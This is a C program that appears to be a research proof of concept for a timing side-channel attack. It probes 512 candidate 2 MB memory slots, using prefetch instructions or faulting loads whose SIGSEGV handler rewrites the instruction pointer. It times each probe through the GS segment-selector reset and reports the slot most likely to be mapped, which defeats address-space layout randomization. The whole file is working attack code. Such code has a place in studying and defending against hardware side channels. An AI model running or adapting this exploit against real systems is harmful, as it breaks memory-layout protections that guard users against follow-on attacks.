#define _GNU_SOURCE
#include <math.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <pthread.h>
#include <semaphore.h>
#include <x86intrin.h>

#define ACYCLE 1000
#define PCYCLE 400000  // depends on your CPU

int inter_count[512][10001], prefetch_flag=1;
double score[512]={0},standard[512]={0},var[512]={0},valid_count[512]={0},valid[512]={0};

extern char stopspeculate[];


void prepare() {
  uint16_t value=1; //non-zero null segment selector value: 1, 2, or 3
  __asm__ volatile("mov %0, %%gs" : : "r"(value));
}


uint16_t check() {
  uint16_t value;
  __asm__ volatile("mov %%gs, %0" : "=r"(value));
  return value;
}


int cycles;


//read 512 possible slot, base address is 0x808000000
int read_addr(int cycles)
{
	int i, j, ret = 0, max = -1, maxi = -1,count;
	unsigned long addr;
	int base=0x80800000;
	
	//get the start of the time slice
	while (check() == 1);
	
	
	for (i = 0; i < cycles; i++) {
	for(j=0;j<512;j++){
	addr=1024*1024*2*j+base;	
     	count=0;
     	
        //create k segmentation fault before count
        if(prefetch_flag==0){
	for(int k=0; k<ACYCLE; k++){
	asm volatile (
	"movzx (%[addr]), %%eax\n\t"
	"stopspeculate: \n\t"
	:
	:
	[addr] "r" (addr)
	);
	}
	}
	
	
        
        //prefetch does not cause segment fault.
        else{
	for(int k=0; k<PCYCLE; k++){
	 _m_prefetchw(addr);
	 }
	  }      
	//use the remaining time slice to count
	prepare();
    	while (check() == 1)
    	{ 
    	++count;
    	}
    	inter_count[j][i]=count;
		
	}
	}
	

	return 0;
}

static char *progname;
int usage(void)
{
	printf("%s: [cycles] [a/p]\n", progname);
	printf("a means directly access, while p means prefetch. We use prefetch instruction by default\n");
	return 1;
}

static void pin_cpu3()
{
	cpu_set_t mask;

	/* PIN to CPU3 */
	CPU_ZERO(&mask);
	CPU_SET(3, &mask);  //select Core 3
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

//filt the abnormal value, just for denoising.

int filter(int i)
{
  int min,tar;
  int flag=0;
  valid[i]=0;
  score[i]=0;
  var[i]=0;
   for(int j=0;j<cycles;j++)
  {
     if(inter_count[i][j]!=0){valid[i]++;} 
     score[i]+=((double)inter_count[i][j]);
  
  }
   score[i]=score[i]/valid[i];
   for(int j=0;j<cycles;j++)
   {	   
  if(inter_count[i][j]!=0) {
	  var[i]+=pow(inter_count[i][j]-score[i],2)/valid[i];
  }
   }
   standard[i]=pow(var[i],0.5);
  
  
   for(int j=0;j<cycles;j++)
  {
      if(inter_count[i][j]!=0&&( inter_count[i][j]<score[i]-2*standard[i] || inter_count[i][j]>score[i]+2*standard[i]))
      {
      inter_count[i][j]=0;
      flag=1;
      }
  
  }
  if(flag==1){
  filter(i);
  
  }

}

//process the result after access-count(read_addr)

int compute()
{
	 
	int tar,tar2,tar3;
	FILE *fp=fopen("result-512","w");
	FILE *fp1=fopen("result","a+");
	for(int i=0;i<512;i++)
	{
	      filter(i);
	}
	   
	//find the max count, which is the target(mapped address) 
	int max0[5];
	double cscore[512];
	for(int i=0;i<512;i++){
		cscore[i]=score[i];
	}
	for(int y=0;y<5;y++){
	max0[y]=0;
	for(int i=0;i<512;i++)
	{
	if(cscore[i]>cscore[max0[y]]){
	max0[y]=i;
	
	  
	}
	}
	cscore[max0[y]]=0;
	
	  
	}
	
	printf("predict_slot is:%d, ",max0[0]);
	
	printf("the rest top-5 slot is:%d %d %d %d,",max0[1],max0[2],max0[3],max0[4]);
	
	printf("mapped_score is:%f,second_score=%f\n",score[max0[0]],score[max0[1]]);

	int base=0x80800000;
	unsigned long addr=base+2*1024*1024*max0[0];
	printf("%p\n\n",addr);
	fprintf(fp1,"%p\n",addr);
	  
	for(int j=0;j<512;j++)
	{
	      fprintf(fp,"%f\n",score[j]);
	}
	  
	 
	return 0;
}
 
//fault handler functions
void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	
	//printf("Caught segfault at address %p\n", siginfo->si_addr);
	ucontext_t *ucontext = (ucontext_t*) context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;

	return;
}


//binding fault handler
int set_signal(void)
{
	struct sigaction act;
	act.sa_sigaction = sigsegv;
	act.sa_flags = SA_SIGINFO;
	return sigaction(SIGSEGV, &act, NULL);
}


int main(int argc, char *argv[])
{
	int ret,  i;
	unsigned long addr;
	char c;
        cpu_set_t get;   
        CPU_ZERO(&get);
	progname = argv[0];
	if (argc < 3)
		return usage();


	if (sscanf(argv[1], "%d", &cycles) != 1)
		return usage();


	if (sscanf(argv[2], "%c", &c) !=1)
		return usage();
	
	if(c=='a') {
	prefetch_flag=0; 
	set_signal();
	}
	
        pin_cpu3();
    	
    	
   	if(sched_getaffinity(0,sizeof(get),&get)==-1)
    	{
   	 printf("warning: can not get cpu affinity/n");
    	}
    	
  	for(int i=0;i<8;i++) {
	if(CPU_ISSET(i,&get))
	{
		//printf("this thread %d is running on processor %d\n", gettid(),i);
	
	}
	}
	read_addr(cycles);
	compute();
	return 0;
	
	
}
